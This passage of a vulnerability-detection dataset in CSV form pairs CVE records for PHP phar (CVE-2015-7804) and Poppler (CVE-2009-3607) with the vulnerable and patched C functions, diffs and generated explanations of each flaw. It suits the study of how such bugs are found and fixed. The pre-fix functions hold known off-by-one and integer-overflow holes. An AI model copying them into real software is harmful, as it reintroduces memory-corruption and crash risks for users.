,Unnamed: 0.1,Unnamed: 0,Access Gained,Attack Origin,Authentication Required,Availability,CVE ID,CVE Page,CWE ID,Complexity,Confidentiality,Integrity,Known Exploits,Publish Date,Score,Summary,Update Date,Vulnerability Classification,add_lines,codeLink,commit_id,commit_message,del_lines,file_name,files_changed,func_after,func_before,lang,lines_after,lines_before,parentID,patch,project,project_after,project_before,vul,vul_func_with_fix,idx,primevul_func_before_fix,primevul_func_after_fix,C1_Description_of_Functionality_In_Context,C2_Description_of_Functionality_Generic,C3_Explanation_of_Vulnerability_In_Context,C4_Explanation_of_Vulnerability_Generic,C5_Explanation_Vulnerability_Fixed_In_Context,C6_Explanation_Vulnerability_Fixed_Generic
				}
				continue;
			}
		}

		if (*dir == '/') {
			/* root directory */
			if (keylen >= sizeof("".phar"")-1 && !memcmp(str_key, "".phar"", sizeof("".phar"")-1)) {
				PHAR_STR_FREE(str_key);
				/* do not add any magic entries to this directory */
				if (SUCCESS != zend_hash_move_forward(manifest)) {
					break;
				}
				continue;
			}

			if (NULL != (found = (char *) memchr(str_key, '/', keylen))) {
				/* the entry has a path separator and is a subdirectory */
				entry = (char *) safe_emalloc(found - str_key, 1, 1);
				memcpy(entry, str_key, found - str_key);
				keylen = found - str_key;
				entry[keylen] = '\0';
			} else {
				entry = (char *) safe_emalloc(keylen, 1, 1);
				memcpy(entry, str_key, keylen);
				entry[keylen] = '\0';
			}

			PHAR_STR_FREE(str_key);
			goto PHAR_ADD_ENTRY;
		} else {
			if (0 != memcmp(str_key, dir, dirlen)) {
				/* entry in directory not found */
				PHAR_STR_FREE(str_key);
				if (SUCCESS != zend_hash_move_forward(manifest)) {
					break;
				}
				continue;
			} else {
				if (str_key[dirlen] != '/') {
					PHAR_STR_FREE(str_key);
					if (SUCCESS != zend_hash_move_forward(manifest)) {
						break;
					}
					continue;
				}
			}
		}

		save = str_key;
		save += dirlen + 1; /* seek to just past the path separator */

		if (NULL != (found = (char *) memchr(save, '/', keylen - dirlen - 1))) {
			/* is subdirectory */
			save -= dirlen + 1;
			entry = (char *) safe_emalloc(found - save + dirlen, 1, 1);
			memcpy(entry, save + dirlen + 1, found - save - dirlen - 1);
			keylen = found - save - dirlen - 1;
			entry[keylen] = '\0';
		} else {
			/* is file */
			save -= dirlen + 1;
			entry = (char *) safe_emalloc(keylen - dirlen, 1, 1);
			memcpy(entry, save + dirlen + 1, keylen - dirlen - 1);
			entry[keylen - dirlen - 1] = '\0';
			keylen = keylen - dirlen - 1;
		}
		PHAR_STR_FREE(str_key);
PHAR_ADD_ENTRY:
		if (keylen) {
			phar_add_empty(data, entry, keylen);
		}

		efree(entry);

		if (SUCCESS != zend_hash_move_forward(manifest)) {
			break;
		}
	}

	if (FAILURE != zend_hash_has_more_elements(data)) {
		efree(dir);
		if (zend_hash_sort(data, zend_qsort, phar_compare_dir_name, 0 TSRMLS_CC) == FAILURE) {
			FREE_HASHTABLE(data);
			return NULL;
		}
		return php_stream_alloc(&phar_dir_ops, data, NULL, ""r"");
	} else {
		efree(dir);
		return php_stream_alloc(&phar_dir_ops, data, NULL, ""r"");
	}
}
/* }}}*/
","The `phar_make_dirstream` function creates a directory stream for a specified directory within a PHP Archive (PHAR) file. It initializes a hash table to store directory entries and processes the provided manifest to identify and add relevant entries to the directory stream. The function handles special cases, such as empty directories and the "".phar"" magic directory, while iterating through the manifest to extract directory and file names. After populating the hash table with valid entries, it sorts the entries and returns a stream representing the directory, or an empty stream if no entries are found.","The provided code defines a function that generates a directory stream for a specified directory within a PHP Archive. It initializes a data structure to hold directory entries and processes a manifest to identify and add relevant entries. The function accounts for special cases, such as empty directories and specific magic directories, while iterating through the manifest to extract directory and file names. After populating the data structure with valid entries, it sorts them and returns a stream representing the directory, or an empty stream if no entries are found, ensuring proper handling of various directory structures.","The vulnerability in the original code arises from an off-by-one error that can lead to accessing uninitialized memory, potentially causing a denial of service through application crashes. Specifically, the issue occurs when the code does not properly validate the length of directory entries, allowing an attacker to manipulate the input to include a malformed filename, such as a leading slash. In the fixed code, the check for the existence of a key in the manifest is updated to use `HASH_KEY_NON_EXISTENT`, ensuring that only valid entries are processed. This prevents the dereferencing of uninitialized pointers and mitigates the risk of crashes.","The vulnerability in the original code is an off-by-one error that can lead to accessing uninitialized memory, resulting in application crashes and potential denial of service. This occurs when the code fails to properly validate the length of directory entries, allowing attackers to exploit malformed filenames, such as those starting with a slash. The fixed code addresses this issue by implementing a more robust check for the existence of keys in the manifest, ensuring that only valid entries are processed. This change prevents the dereferencing of uninitialized pointers, thereby mitigating the risk of crashes and enhancing overall stability.","The vulnerability was fixed by modifying the condition that checks for the existence of keys in the manifest. In the original code, the check for the current key was not robust enough, potentially allowing uninitialized memory access. The updated code uses `HASH_KEY_NON_EXISTENT` in the condition that retrieves the current key, ensuring that only valid keys are processed. This change prevents the code from attempting to dereference uninitialized pointers when handling directory entries. Additionally, the overall logic for processing entries was refined to ensure that only properly validated entries are added to the data structure, enhancing stability and security.","The vulnerability was fixed by enhancing the validation checks for directory entries to ensure that only valid and existing keys are processed. The updated code introduces a more stringent condition that verifies the existence of keys before attempting to access them, thereby preventing the dereferencing of uninitialized memory. This change effectively mitigates the risk of crashes caused by malformed input, such as filenames that could lead to off-by-one errors. Overall, the adjustments improve the robustness of the code, ensuring that it handles directory entries safely and securely, thus enhancing the application's stability."
2,177744,177744,,Remote,Not required,Partial,CVE-2015-7804,https://www.cvedetails.com/cve/CVE-2015-7804/,CWE-189,Medium,Partial,Partial,,2015-12-11,6.8,Off-by-one error in the phar_parse_zipfile function in ext/phar/zip.c in PHP before 5.5.30 and 5.6.x before 5.6.14 allows remote attackers to cause a denial of service (uninitialized pointer dereference and application crash) by including the / filename in a .zip PHAR archive.,2016-12-07,DoS,1,https://git.php.net/?p=php-src.git;a=commit;h=1ddf72180a52d247db88ea42a3e35f824a8fbda1,1ddf72180a52d247db88ea42a3e35f824a8fbda2,,1,,,"void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */
{
	const char *s;
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }
}
/* }}} */
","void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */
{
	const char *s;
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }
}
/* }}} */
",C,"               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
","               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
",f98ab19dc0c978e3caaa2614579e4a61f2c317f6,"@@ -1977,7 +1977,7 @@ void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
-               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
+               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }",php,https://git.php.net/?p=php-src.git;a=blob;f=ext/phar/util.c;h=303daede45570591c74e8fbc94f0d6ebf617a529;hb=303daede45570591c74e8fbc94f0d6ebf617a529,https://git.php.net/?p=php-src.git;a=blob;f=ext/phar/util.c;h=e7decda9cde3741d0c4a9a4407a9795d45e6fdc0;hb=e7decda9cde3741d0c4a9a4407a9795d45e6fdc0,1,"void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */
{
	const char *s;
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
//flaw_line_below:
               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
//fix_flaw_line_below:
//               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }
}
/* }}} */
",177744,"void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */
{
	const char *s;
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }
}
/* }}} */
","void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */
{
	const char *s;
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }
}
/* }}} */
","The function `phar_add_virtual_dirs` is designed to add virtual directory entries to a `phar_archive_data` structure based on the provided `filename`. It utilizes a loop to search for the last occurrence of the '/' character in the filename, effectively identifying directory paths. For each found directory, it calculates the length of the substring representing the directory and attempts to add it as an empty element to the `virtual_dirs` hash table within the `phar` structure. The process continues until no more directories can be found or an addition fails, ensuring that all valid directories are registered.","The provided code defines a function that processes a given filename to extract and register virtual directory paths within a specific data structure. It searches for the last occurrence of a directory separator in the filename, allowing it to identify and isolate directory components. For each identified directory, the function attempts to add it as an entry in a hash table designated for virtual directories. The process continues iteratively until no more directories can be found or an attempt to add a directory fails, ensuring that all valid directory paths are captured and stored appropriately.","The vulnerability in the original code arises from an off-by-one error, where the function could attempt to add an empty directory entry if the filename length is zero, leading to an uninitialized pointer dereference and potential application crash. This occurs because the code does not check if the calculated `filename_len` is zero before attempting to add it to the hash table. The fixed code addresses this issue by introducing a condition that checks if `filename_len` is non-zero before calling `zend_hash_add_empty_element`, ensuring that only valid, non-empty directory names are processed, thus preventing the vulnerability.","The vulnerability in the original code stems from an off-by-one error that allows the function to process an empty directory entry, which can lead to an uninitialized pointer dereference and cause the application to crash. This occurs when the length of the filename is zero, allowing an invalid entry to be added. The fixed code mitigates this issue by implementing a check to ensure that the length of the filename is non-zero before attempting to add it as a directory entry. This prevents the function from processing empty entries, thereby eliminating the potential for a denial of service attack.","The vulnerability was fixed by adding a condition that checks if `filename_len` is non-zero before attempting to add the directory entry to the hash table. In the modified code, the check `!filename_len` is introduced in the if statement alongside the existing failure condition. This ensures that if the calculated length of the filename is zero, the function will break out of the loop and not call `zend_hash_add_empty_element`, thus preventing the addition of an empty directory entry. This change effectively eliminates the risk of uninitialized pointer dereference and potential application crashes.","The vulnerability was addressed by implementing a validation check to ensure that the length of the filename is greater than zero before proceeding to add it as a directory entry. This modification prevents the function from attempting to add an empty directory, which could lead to uninitialized pointer dereference and application crashes. By incorporating this condition, the code now effectively avoids processing invalid entries, thereby enhancing the robustness of the function and mitigating the risk of denial of service attacks that could arise from malformed input."
3,177773,177773,Admin,Remote,Not required,Complete,CVE-2009-3607,https://www.cvedetails.com/cve/CVE-2009-3607/,CWE-189,Medium,Complete,Complete,,2009-10-21,9.3,Integer overflow in the create_surface_from_thumbnail_data function in glib/poppler-page.cc in Poppler 0.x allows remote attackers to cause a denial of service (memory corruption) or possibly execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.  NOTE: some of these details are obtained from third party information.,2017-08-16,DoS Exec Code Overflow Mem. Corr.,10,https://cgit.freedesktop.org/poppler/poppler/commit/?id=c839b706,c839b706092583f6b12ed3cc634bf5af34b7a2bb,,9,,,"create_surface_from_thumbnail_data (guchar *data,
				    gint    width,
				    gint    height,
 				    gint    rowstride)
 {
   guchar *cairo_pixels;
  gint cairo_stride;
   cairo_surface_t *surface;
   int j;
 
  surface = cairo_image_surface_create (CAIRO_FORMAT_RGB24, width, height);
  if (cairo_surface_status (surface))
    return NULL;

  cairo_pixels = cairo_image_surface_get_data (surface);
  cairo_stride = cairo_image_surface_get_stride (surface);
 
   for (j = height; j; j--) {
     guchar *p = data;
     guchar *q = cairo_pixels;
     guchar *end = p + 3 * width;

     while (p < end) {
 #if G_BYTE_ORDER == G_LITTLE_ENDIAN
       q[0] = p[2];
       q[1] = p[1];
       q[2] = p[0];
#else
       q[1] = p[0];
       q[2] = p[1];
       q[3] = p[2];
#endif
      p += 3;
      q += 4;
     }
 
     data += rowstride;
    cairo_pixels += cairo_stride;
   }
 
   return surface;
}
","create_surface_from_thumbnail_data (guchar *data,
				    gint    width,
				    gint    height,
 				    gint    rowstride)
 {
   guchar *cairo_pixels;
   cairo_surface_t *surface;
  static cairo_user_data_key_t key;
   int j;
 
  cairo_pixels = (guchar *)g_malloc (4 * width * height);
  surface = cairo_image_surface_create_for_data ((unsigned char *)cairo_pixels,
						 CAIRO_FORMAT_RGB24,
						 width, height, 4 * width);
  cairo_surface_set_user_data (surface, &key,
			       cairo_pixels, (cairo_destroy_func_t)g_free);
 
   for (j = height; j; j--) {
     guchar *p = data;
     guchar *q = cairo_pixels;
     guchar *end = p + 3 * width;
     while (p < end) {
 #if G_BYTE_ORDER == G_LITTLE_ENDIAN
       q[0] = p[2];
       q[1] = p[1];
       q[2] = p[0];
#else	  
       q[1] = p[0];
       q[2] = p[1];
       q[3] = p[2];
#endif
      p += 3;
      q += 4;
     }
 
     data += rowstride;
    cairo_pixels += 4 * width;
   }
 
   return surface;
}
",CPP,"  gint cairo_stride;
  surface = cairo_image_surface_create (CAIRO_FORMAT_RGB24, width, height);
  if (cairo_surface_status (surface))
    return NULL;

  cairo_pixels = cairo_image_surface_get_data (surface);
  cairo_stride = cairo_image_surface_get_stride (surface);

#else
    cairo_pixels += cairo_stride;
","  static cairo_user_data_key_t key;
  cairo_pixels = (guchar *)g_malloc (4 * width * height);
  surface = cairo_image_surface_create_for_data ((unsigned char *)cairo_pixels,
						 CAIRO_FORMAT_RGB24,
						 width, height, 4 * width);
  cairo_surface_set_user_data (surface, &key,
			       cairo_pixels, (cairo_destroy_func_t)g_free);
